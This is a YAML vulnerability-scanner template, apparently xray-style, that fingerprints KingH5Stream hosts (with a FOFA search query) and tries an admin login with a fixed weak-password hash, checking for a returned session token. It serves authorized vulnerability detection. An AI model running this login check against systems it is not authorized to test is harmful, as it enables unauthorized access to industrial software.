id: poc-yaml-kingh5stream-weak-password
info:
  name: 北京亚控科技KingH5Stream 弱口令漏洞
  severity: medium
  tags:
  - 弱口令
  finger: kingh5stream
  fofa: body="kingH5stream"
requests:
- method: GET
  path: /
  expression: status_code == 200 && contains(body,"KingH5Stream")
- method: GET
  path: /api/v1/Login?user=admin&password=827ccb0eea8a706c4c34a16891f84e7b
  expression: "status_code == 200 && \ncontains(body,\"\\\"bStatus\\\"\\x3a true\"\
    ) &&\nmatches(body,\"\\\"strSession\\\"\\x3a \\\"[0-9a-zA-Z-]+\\\"\") &&\ncontains(content_type,\"\
    application/json\")\n"
variables: {}
transport: http
